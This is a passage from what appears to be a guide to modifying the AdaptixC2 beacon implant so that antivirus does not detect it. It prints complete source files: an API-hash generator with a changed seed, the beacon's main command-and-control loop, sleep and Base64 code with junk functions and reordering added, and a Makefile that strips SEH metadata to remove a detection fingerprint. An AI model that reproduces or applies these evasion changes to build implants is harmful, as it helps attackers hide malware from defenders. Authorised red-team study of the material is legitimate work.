                        memset(fwdMod, 0, StrLenA(fwdMod));
                        memset(fwdFunc, 0, StrLenA(fwdFunc));

                        depth--;
                        return r;
                    }

                    memset(fwdMod, 0, StrLenA(fwdMod));
                    memset(fwdFunc, 0, StrLenA(fwdFunc));
                }
                break;
            }
            else {
                depth--;
                return (LPVOID) resolved;
            }
        }
        nameTable += sizeof(DWORD);
        ordTable  += sizeof(WORD);
    }

    depth--;
    return NULL;
}
```

### hashes.py (Full File)

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/files/hashes.py`

The hash generator script. Seed changed from 1572 to 7349. Also fixed: null byte truncation in library names, four missing functions (`TryEnterCriticalSection`, `ResetEvent`, `CreateProcessWithTokenW`, `BeaconGetStopJobEvent`), and a missing `#if defined(DEBUG)` guard around the `printf` hash.

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import sys

def djb2a(input_str: str) -> int:
    input_str = input_str.lower()
    hash_value = 7349
    for char in input_str:
        hash_value = ((hash_value << 5) + hash_value) + ord(char)
    return hash_value & 0xFFFFFFFF

def djb2w(input_str: str) -> int:
    input_str = input_str.lower()
    hash_value = 7349
    for i in range(0, len(input_str), 2):
        val = int.from_bytes(input_str[i:i+2].encode(), 'little')
        hash_value = ((hash_value << 5) + hash_value) + val
    return hash_value & 0xFFFFFFFF

##############################################

libs = """
// ntdll.dll
n\x00t\x00d\x00l\x00l\x00.\x00d\x00l\x00l\x00
// kernel32.dll
k\x00e\x00r\x00n\x00e\x00l\x003\x002\x00.\x00d\x00l\x00l\x00
// iphlpapi.dll
i\x00p\x00h\x00l\x00p\x00a\x00p\x00i\x00.\x00d\x00l\x00l\x00
// advapi32.dll
a\x00d\x00v\x00a\x00p\x00i\x003\x002\x00.\x00d\x00l\x00l\x00
// msvcrt.dll
m\x00s\x00v\x00c\x00r\x00t\x00.\x00d\x00l\x00l\x00
"""

functions = """
//ntdll
NtClose
NtContinue
NtFreeVirtualMemory
NtQueryInformationProcess
NtQuerySystemInformation
NtOpenProcess
NtOpenProcessToken
NtOpenThreadToken
NtTerminateThread
NtTerminateProcess
RtlGetVersion
RtlExitUserThread
RtlExitUserProcess
RtlIpv4StringToAddressA
RtlRandomEx
RtlNtStatusToDosError
NtFlushInstructionCache

//kernel32
ConnectNamedPipe
CopyFileA
CreateDirectoryA
CreateEventA
CreateFileA
CreateNamedPipeA
CreatePipe
CreateProcessA
CreateThread
DeleteCriticalSection
DeleteFileA
DisconnectNamedPipe
EnterCriticalSection
FindClose
FindFirstFileA
FindNextFileA
FreeLibrary
FlushFileBuffers
GetACP
GetComputerNameExA
GetCurrentDirectoryA
GetDriveTypeA
GetExitCodeProcess
GetExitCodeThread
GetFileSize
GetFileAttributesA
GetFullPathNameA
GetLastError
GetLogicalDrives
GetOEMCP
K32GetModuleBaseNameA
GetModuleBaseNameA
GetModuleHandleA
GetProcAddress
GetLocalTime
GetSystemTimeAsFileTime
GetTickCount
GetTimeZoneInformation
GetUserNameA
HeapAlloc
HeapCreate
HeapDestroy
HeapReAlloc
HeapFree
InitializeCriticalSection
IsWow64Process
LoadLibraryA
LocalAlloc
LocalFree
LocalReAlloc
LeaveCriticalSection
MoveFileA
MultiByteToWideChar
PeekNamedPipe
ReadFile
RemoveDirectoryA
RtlCaptureContext
SetCurrentDirectoryA
SetEvent
SetNamedPipeHandleState
Sleep
VirtualAlloc
VirtualFree
WaitForSingleObject
WaitNamedPipeA
WideCharToMultiByte
WriteFile
TryEnterCriticalSection
ResetEvent
CreateProcessWithTokenW

// iphlpapi
GetAdaptersInfo

// advapi32
AllocateAndInitializeSid
GetTokenInformation
InitializeSecurityDescriptor
ImpersonateLoggedOnUser
FreeSid
LookupAccountSidA
RevertToSelf
SetThreadToken
SetEntriesInAclA
SetSecurityDescriptorDacl
DuplicateTokenEx
CreateProcessAsUserA

// msvcrt
printf
vsnprintf
_snprintf

// BOF
BeaconDataParse
BeaconDataInt
BeaconDataShort
BeaconDataLength
BeaconDataExtract
BeaconFormatAlloc
BeaconFormatReset
BeaconFormatAppend
BeaconFormatPrintf
BeaconFormatToString
BeaconFormatFree
BeaconFormatInt
BeaconOutput
BeaconPrintf
BeaconUseToken
BeaconRevertToken
BeaconIsAdmin
BeaconGetSpawnTo
BeaconInjectProcess
BeaconInjectTemporaryProcess
BeaconSpawnTemporaryProcess
BeaconCleanupProcess
toWideChar
BeaconInformation
BeaconAddValue
BeaconGetValue
BeaconRemoveValue
LoadLibraryA
GetProcAddress
GetModuleHandleA
FreeLibrary
__C_specific_handler
AxAddScreenshot
AxDownloadMemory
// Async BOF
BeaconRegisterThreadCallback
BeaconUnregisterThreadCallback
BeaconWakeup
BeaconGetStopJobEvent

// wininet
InternetOpenA
InternetConnectA
HttpOpenRequestA
HttpSendRequestA
InternetSetOptionA
InternetQueryOptionA
HttpQueryInfoA
InternetQueryDataAvailable
InternetCloseHandle
InternetReadFile

// ws2_32
WSAStartup
WSACleanup
socket
gethostbyname
ioctlsocket
connect
setsockopt
getsockopt
WSAGetLastError
closesocket
select
__WSAFDIsSet
shutdown
recv
send
accept
bind
listen
recvfrom
sendto
"""

##############################################

print('#pragma once')

for f in libs.split('\n'):
    if len(f) == 0:
        print()
    elif f[:2]=='//':
        continue
    else:
        clean = f.replace('\x00', '').upper().split(".")[0]
        print('#define HASH_LIB_%s%s0x%x' % ( clean, (35-len(f))*" ", djb2w(f) ) )

for f in functions.split('\n'):
    if len(f) == 0:
        print()
    elif f[:2]=='//':
        print(f)
    elif f == 'printf':
        print('#if defined(DEBUG)')
        print('#define HASH_FUNC_%s%s0x%x' % ( f.upper(), (35-len(f))*" ", djb2a(f) ) )
        print('#endif')
    else:
        print('#define HASH_FUNC_%s%s0x%x' % ( f.upper(), (35-len(f))*" ", djb2a(f) ) )
```

### Regenerating ApiDefines.h

Run this **before** building, or the hash constants won't match the runtime seed:

```bash
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon/files
python3 hashes.py > ../beacon/ApiDefines.h
```

---

## Change 12: Function Reordering and Junk Code in MainAgent.cpp

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/MainAgent.cpp`

Functions reordered to shift their compiled positions. Added a volatile junk function (`AgentTickle`) that the compiler can't optimize away, inserting real instructions between functional code blocks.

### MainAgent.cpp (Full File)

```cpp
#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"
#include "Boffer.h"
#include "Connector.h"

#if defined(BEACON_HTTP)
#include "ConnectorHTTP.h"
#elif defined(BEACON_SMB)
#include "ConnectorSMB.h"
#elif defined(BEACON_TCP)
#include "ConnectorTCP.h"
#elif defined(BEACON_DNS)
#include "ConnectorDNS.h"
#endif

Agent* g_Agent;
Connector* g_Connector;

void AgentExit(const int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}

static volatile ULONG g_Entropy = 0x4E2F1A;

static ULONG AgentTickle(ULONG seed)
{
	seed ^= seed << 7;
	seed ^= seed >> 13;
	seed ^= seed << 9;
	return seed;
}

static Connector* CreateConnector()
{
#if defined(BEACON_HTTP)
	return new ConnectorHTTP();
#elif defined(BEACON_SMB)
	return new ConnectorSMB();
#elif defined(BEACON_TCP)
	return new ConnectorTCP();
#elif defined(BEACON_DNS)
	return new ConnectorDNS();
#endif
}

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	g_Entropy = AgentTickle(g_Entropy);

	if (!ApiLoad())
		return 0;

	g_Entropy = AgentTickle(g_Entropy ^ 0xA3);

	g_Agent = new Agent();
	g_Connector = CreateConnector();

	g_AsyncBofManager = new Boffer();
	g_AsyncBofManager->Initialize();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if (!g_Connector->SetProfile(&g_Agent->config->profile, beat, beatSize))
		return 0;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	Packer* pOut = new Packer();
	pOut->Pack32(0);

	do {
		if (!g_Connector->WaitForConnection())
			continue;

		do {
			if (pOut->datasize() > 4) {
				pOut->Set32(0, pOut->datasize());
				g_Connector->Exchange(pOut->data(), pOut->datasize(), g_Agent->SessionKey);
				pOut->Clear(TRUE);
				pOut->Pack32(0);
			}
			else {
				g_Connector->Exchange(nullptr, 0, g_Agent->SessionKey);
			}

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData())
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), pOut);
			g_Connector->RecvClear();

			g_Agent->downloader->ProcessDownloader(pOut);
			g_Agent->jober->ProcessJobs(pOut);
			g_Agent->proxyfire->ProcessTunnels(pOut);
			g_Agent->pivotter->ProcessPivots(pOut);
			g_AsyncBofManager->ProcessAsyncBofs(pOut);

			if (g_Agent->IsActive()) {
				const BOOL hasOutput = (pOut->datasize() >= 8);
				g_Connector->Sleep(g_AsyncBofManager->GetWakeupEvent(), g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
			}

		} while (g_Connector->IsConnected() && g_Agent->IsActive());

		if (!g_Agent->IsActive() && g_Connector->IsConnected()) {
			g_Agent->commander->Exit(pOut);
			pOut->Set32(0, pOut->datasize());
			g_Connector->Exchange(pOut->data(), pOut->datasize(), g_Agent->SessionKey);
			g_Connector->RecvClear();
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	g_Entropy = AgentTickle(g_Entropy);

	pOut->Clear(FALSE);
	delete pOut;

	g_Connector->CloseConnector();
	AgentExit(g_Agent->config->exit_method);
	return 0;
}
```

**What changed:**
- `AgentExit()` moved before `AgentMain()` (originally was after it)
- Added `volatile ULONG g_Entropy` and `AgentTickle()` XOR-shift function
- `AgentTickle()` calls scattered at three points: start of `AgentMain`, after `ApiLoad()`, and before cleanup
- `packerOut` renamed to `pOut`

---

## Change 13: Function Reordering and Junk Code in WaitMask.cpp

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/WaitMask.cpp`

Same approach as MainAgent.cpp. Functions reordered, volatile junk function added.

### WaitMask.cpp (Full File)

```cpp
#include "WaitMask.h"

static volatile ULONG g_WaitSeed = 0x7C3A;

static ULONG WaitJitter(ULONG v)
{
    v ^= v << 5;
    v ^= v >> 11;
    v ^= v << 3;
    return v;
}

void mySleep(ULONG ms)
{
    g_WaitSeed = WaitJitter(g_WaitSeed ^ ms);
    ApiWin->Sleep(ms);
}

void WaitMaskWithEvent(HANDLE hEvent, ULONG worktime, ULONG sleepTime, ULONG jitter)
{
    ULONG maxSleepTime = 0;
    if (worktime) {
        maxSleepTime = worktime * 1000;
    }
    else if (sleepTime) {
        maxSleepTime = sleepTime * 1000;
        if (jitter) {
            ULONG deltaTime = 0;
            ULONG minTime = sleepTime * jitter / 100;
            if (minTime)
                deltaTime = GenerateRandom32() % minTime;
            if (deltaTime < maxSleepTime)
                maxSleepTime -= deltaTime;
        }
    }

    g_WaitSeed = WaitJitter(g_WaitSeed);

    if (hEvent) {
        DWORD waitResult = ApiWin->WaitForSingleObject(hEvent, maxSleepTime);
        if (waitResult == WAIT_OBJECT_0)
            ApiWin->ResetEvent(hEvent);
    }
    else {
        ApiWin->Sleep(maxSleepTime);
    }
}

void WaitMask(ULONG worktime, ULONG sleepTime, ULONG jitter)
{
    ULONG maxSleepTime = 0;
    if (worktime) {
        maxSleepTime = worktime * 1000;
    }
    else if (sleepTime) {
        maxSleepTime = sleepTime * 1000;
        if (jitter) {
            ULONG deltaTime = 0;
            ULONG minTime = sleepTime * jitter / 100;
            if (minTime)
                deltaTime = GenerateRandom32() % minTime;
            if (deltaTime < maxSleepTime)
                maxSleepTime -= deltaTime;
        }
    }
    mySleep(maxSleepTime);
}
```

**What changed:**
- Original order: `WaitMask`, `WaitMaskWithEvent`, `mySleep`
- New order: `mySleep`, `WaitMaskWithEvent`, `WaitMask`
- Added `volatile ULONG g_WaitSeed` and `WaitJitter()` XOR-shift function
- `WaitJitter()` calls inserted in `mySleep` and `WaitMaskWithEvent`

---

## Change 14: Function Reordering and Variable Renames in Encoders.cpp

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/beacon/Encoders.cpp`

Encode functions moved before decode functions. Variables renamed throughout.

### Encoders.cpp (Full File)

```cpp
#include "Encoders.h"
#include "ApiLoader.h"
#include "utils.h"

/// BASE64

char b64chars[64] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' };

int b64invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 };

int b64_isvalidchar(char c)
{
    if (c >= '0' && c <= '9')
        return 1;
    if (c >= 'A' && c <= 'Z')
        return 1;
    if (c >= 'a' && c <= 'z')
        return 1;
    if (c == '+' || c == '/' || c == '=')
        return 1;
    return 0;
}

int b64_encoded_size(int inLen)
{
    int sz = inLen;
    if (inLen % 3 != 0)
        sz += 3 - (inLen % 3);
    sz /= 3;
    sz *= 4;
    return sz;
}

char* b64_encode(const unsigned char* raw, int rawLen)
{
    int  total;
    int  idx;
    int  w;
    int  bits;

    if (raw == NULL || rawLen == 0)
        return NULL;

    total = b64_encoded_size(rawLen);
    char* dst = (char* ) ApiWin->LocalAlloc(LPTR, total + 1);
    if (!dst)
        return NULL;
    dst[total] = '\0';

    for (idx = 0, w = 0; idx < rawLen; idx += 3, w += 4) {
        bits = raw[idx];
        bits = idx + 1 < rawLen ? bits << 8 | raw[idx + 1] : bits << 8;
        bits = idx + 2 < rawLen ? bits << 8 | raw[idx + 2] : bits << 8;

        dst[w] = b64chars[(bits >> 18) & 0x3F];
        dst[w + 1] = b64chars[(bits >> 12) & 0x3F];
        if (idx + 1 < rawLen) {
            dst[w + 2] = b64chars[(bits >> 6) & 0x3F];
        }
        else {
            dst[w + 2] = '=';
        }
        if (idx + 2 < rawLen) {
            dst[w + 3] = b64chars[bits & 0x3F];
        }
        else {
            dst[w + 3] = '=';
        }
    }

    return dst;
}

int b64_decoded_size(const char* inp)
{
    int slen;
    int total;
    int tail;

    if (inp == NULL)
        return 0;

    slen = StrLenA((CHAR*)inp);
    total = slen / 4 * 3;

    for (tail = slen; tail-- > 0; ) {
        if (inp[tail] == '=') {
            total--;
        }
        else {
            break;
        }
    }

    return total;
}

int b64_decode(const char* inp, unsigned char* out, int outCap)
{
    int slen;
    int idx;
    int w;
    int bits;

    if (inp == NULL || out == NULL)
        return 0;

    slen = StrLenA((CHAR*)inp);
    if (slen % 4 != 0)
        return 0;

    int total = slen / 4 * 3;
    for (idx = slen; idx-- > 0; ) {
        if (inp[idx] == '=')
            total--;
        else
            break;
    }
    if (outCap < total)
        return 0;

    for (idx = 0; idx < slen; idx++) {
        if (!b64_isvalidchar(inp[idx])) {
            return 0;
        }
    }

    for (idx = 0, w = 0; idx < slen; idx += 4, w += 3) {
        bits = b64invs[inp[idx] - 43];
        bits = (bits << 6) | b64invs[inp[idx + 1] - 43];
        bits = inp[idx + 2] == '=' ? bits << 6 : (bits << 6) | b64invs[inp[idx + 2] - 43];
        bits = inp[idx + 3] == '=' ? bits << 6 : (bits << 6) | b64invs[inp[idx + 3] - 43];

        out[w] = (bits >> 16) & 0xFF;
        if (inp[idx + 2] != '=')
            out[w + 1] = (bits >> 8) & 0xFF;
        if (inp[idx + 3] != '=')
            out[w + 2] = bits & 0xFF;
    }

    return 1;
}
```

**What changed:**
- Original function order: `b64_isvalidchar`, `b64_decoded_size`, `b64_decode`, `b64_encoded_size`, `b64_encode`
- New order: `b64_isvalidchar`, `b64_encoded_size`, `b64_encode`, `b64_decoded_size`, `b64_decode`
- Variables renamed throughout (e.g. `src`/`srcLen` to `raw`/`rawLen`, `result` to `sz`, `buf` to `dst`, `pos` to `idx`)

---

---

## Change 15: Stripping SEH Metadata (.pdata/.xdata)

ThreatCheck found a detection at **offset 0x18704**. Ghidra showed this lands in the `.pdata`/`.xdata` sections, which contain SEH (Structured Exception Handling) metadata describing every function's stack layout. These form a unique fingerprint that AV can match even after code changes.

The fix is to strip both sections from every compiled object file with `objcopy -R .pdata -R .xdata`. This is safe because the beacon is compiled with `-fno-exceptions` and `-fno-unwind-tables`, so it never needs this metadata.

The Makefile runs the strip automatically after compilation for both x64 and x86 targets. See the full Makefile below.

### Makefile (Full File)

**Server path:** `AdaptixServer/extenders/beacon_agent/src_beacon/Makefile`

```makefile
SOURCES := $(filter-out beacon/config.cpp, $(wildcard beacon/*.cpp))

CXX_X64 := x86_64-w64-mingw32-g++
CXX_X86 := i686-w64-mingw32-g++
ASM_SYNTAX := -masm=intel

BEACON_DIR := "beacon"
FILES_DIR := "files"
HTTP_DIST_DIR := "objects_http"
SMB_DIST_DIR := "objects_smb"
TCP_DIST_DIR := "objects_tcp"
DNS_DIST_DIR := "objects_dns"

HTTP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x64.o, $(SOURCES))
HTTP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(HTTP_DIST_DIR)/%.x86.o, $(SOURCES))

SMB_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(SMB_DIST_DIR)/%.x64.o, $(SOURCES))
SMB_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(SMB_DIST_DIR)/%.x86.o, $(SOURCES))

TCP_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x64.o, $(SOURCES))
TCP_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(TCP_DIST_DIR)/%.x86.o, $(SOURCES))

DNS_OBJECTS_X64 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x64.o, $(SOURCES))
DNS_OBJECTS_X86 := $(patsubst beacon/%.cpp, $(DNS_DIST_DIR)/%.x86.o, $(SOURCES))

SECURITY_FLAGS := -fno-stack-protector \
                 -fno-strict-overflow \
                 -fno-delete-null-pointer-checks \
                 -fno-strict-aliasing \
                 -fno-builtin

OPTIMIZATION_FLAGS := -fno-exceptions \
                     -fno-rtti \
                     -fno-unwind-tables \
                     -fno-asynchronous-unwind-tables

COMMON_FLAGS := -I $(BEACON_DIR) \
                -fpermissive \
                -w \
                $(ASM_SYNTAX) \
                -fPIC \
                $(SECURITY_FLAGS) \
                $(OPTIMIZATION_FLAGS)

# Miniz trim: disable stdio/archive/time/assert to eliminate CRT dependencies.
# Keeps zlib compress/uncompress for DnsCodec.
MINIZ_TRIM_FLAGS := -DMINIZ_NO_STDIO -DMINIZ_NO_ARCHIVE_APIS -DMINIZ_NO_ARCHIVE_WRITING_APIS -DMINIZ_NO_TIME -DMINIZ_NO_ASSERT

.PHONY: all clean pre x64 x86

NPROC := $(shell nproc)
ifeq ($(MAKELEVEL), 0)
    MAKEFLAGS += -j$(NPROC) --no-print-directory
endif

all: clean pre x64 x86

pre:
	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)
	@ # http
	@ cp $(FILES_DIR)/config.tpl $(HTTP_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(HTTP_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(HTTP_DIST_DIR)/stub.x86.bin
	@ # smb
	@ cp $(FILES_DIR)/config.tpl $(SMB_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(SMB_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(SMB_DIST_DIR)/stub.x86.bin
	@ # tcp
	@ cp $(FILES_DIR)/config.tpl $(TCP_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(TCP_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(TCP_DIST_DIR)/stub.x86.bin
	@ # dns
	@ cp $(FILES_DIR)/config.tpl $(DNS_DIST_DIR)/config.cpp
	@ cp $(FILES_DIR)/stub.x64.bin $(DNS_DIST_DIR)/stub.x64.bin
	@ cp $(FILES_DIR)/stub.x86.bin $(DNS_DIST_DIR)/stub.x86.bin

clean:
	@rm -rf $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)
	@mkdir -p $(HTTP_DIST_DIR) $(SMB_DIST_DIR) $(TCP_DIST_DIR) $(DNS_DIST_DIR)

x64: $(HTTP_OBJECTS_X64) $(SMB_OBJECTS_X64) $(TCP_OBJECTS_X64) $(DNS_OBJECTS_X64)
	@ # http
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(HTTP_DIST_DIR)/ConnectorSMB.x64.o $(HTTP_DIST_DIR)/ConnectorTCP.x64.o $(HTTP_DIST_DIR)/ConnectorDNS.x64.o
	@ # smb
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(SMB_DIST_DIR)/ConnectorHTTP.x64.o $(SMB_DIST_DIR)/ConnectorTCP.x64.o $(SMB_DIST_DIR)/ConnectorDNS.x64.o
	@ # tcp
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(TCP_DIST_DIR)/ConnectorHTTP.x64.o $(TCP_DIST_DIR)/ConnectorSMB.x64.o $(TCP_DIST_DIR)/ConnectorDNS.x64.o
	@ # dns
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SVC -o $(DNS_DIST_DIR)/main_service.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x64.o
	@$(CXX_X64) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x64.o
	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x64.o $(DNS_DIST_DIR)/ConnectorSMB.x64.o $(DNS_DIST_DIR)/ConnectorTCP.x64.o
	@ # strip SEH metadata (.pdata/.xdata) to remove UNWIND_INFO fingerprint
	@for f in $(HTTP_DIST_DIR)/*.x64.o $(SMB_DIST_DIR)/*.x64.o $(TCP_DIST_DIR)/*.x64.o $(DNS_DIST_DIR)/*.x64.o; do \
		x86_64-w64-mingw32-objcopy -R .pdata -R .xdata "$$f" 2>/dev/null || true; \
	done

x86: $(HTTP_OBJECTS_X86) $(SMB_OBJECTS_X86) $(TCP_OBJECTS_X86) $(DNS_OBJECTS_X86)
	@ # http
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SVC -o $(HTTP_DIST_DIR)/main_service.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_HTTP -D BUILD_DLL -o $(HTTP_DIST_DIR)/main_dll.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_HTTP -D BUILD_SHELLCODE -o $(HTTP_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(HTTP_DIST_DIR)/ConnectorSMB.x86.o $(HTTP_DIST_DIR)/ConnectorTCP.x86.o $(HTTP_DIST_DIR)/ConnectorDNS.x86.o
	@ # smb
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SVC -o $(SMB_DIST_DIR)/main_service.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_SMB -D BUILD_DLL -o $(SMB_DIST_DIR)/main_dll.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_SMB -D BUILD_SHELLCODE -o $(SMB_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(SMB_DIST_DIR)/ConnectorHTTP.x86.o $(SMB_DIST_DIR)/ConnectorTCP.x86.o $(SMB_DIST_DIR)/ConnectorDNS.x86.o
	@ # tcp
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SVC -o $(TCP_DIST_DIR)/main_service.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_TCP -D BUILD_DLL -o $(TCP_DIST_DIR)/main_dll.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_TCP -D BUILD_SHELLCODE -o $(TCP_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(TCP_DIST_DIR)/ConnectorHTTP.x86.o $(TCP_DIST_DIR)/ConnectorSMB.x86.o $(TCP_DIST_DIR)/ConnectorDNS.x86.o
	@ # dns
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SVC -o $(DNS_DIST_DIR)/main_service.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D_WIN32_WINNT=0x0600 -D BEACON_DNS -D BUILD_DLL -o $(DNS_DIST_DIR)/main_dll.x86.o
	@$(CXX_X86) -c $(COMMON_FLAGS) $(BEACON_DIR)/main.cpp -D BEACON_DNS -D BUILD_SHELLCODE -o $(DNS_DIST_DIR)/main_shellcode.x86.o
	@rm -f $(DNS_DIST_DIR)/ConnectorHTTP.x86.o $(DNS_DIST_DIR)/ConnectorSMB.x86.o $(DNS_DIST_DIR)/ConnectorTCP.x86.o
	@ # strip SEH metadata (.pdata/.xdata) to remove UNWIND_INFO fingerprint
	@for f in $(HTTP_DIST_DIR)/*.x86.o $(SMB_DIST_DIR)/*.x86.o $(TCP_DIST_DIR)/*.x86.o $(DNS_DIST_DIR)/*.x86.o; do \
		i686-w64-mingw32-objcopy -R .pdata -R .xdata "$$f" 2>/dev/null || true; \
	done


$(HTTP_DIST_DIR)/%.x64.o: beacon/%.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_HTTP -c $< -o $@

$(HTTP_DIST_DIR)/%.x86.o: beacon/%.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_HTTP -c $< -o $@



$(SMB_DIST_DIR)/%.x64.o: beacon/%.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_SMB -c $< -o $@

$(SMB_DIST_DIR)/%.x86.o: beacon/%.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_SMB -c $< -o $@



$(TCP_DIST_DIR)/%.x64.o: beacon/%.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_TCP -c $< -o $@

$(TCP_DIST_DIR)/%.x86.o: beacon/%.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_TCP -c $< -o $@



$(DNS_DIST_DIR)/%.x64.o: beacon/%.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_DNS -c $< -o $@

$(DNS_DIST_DIR)/%.x86.o: beacon/%.cpp
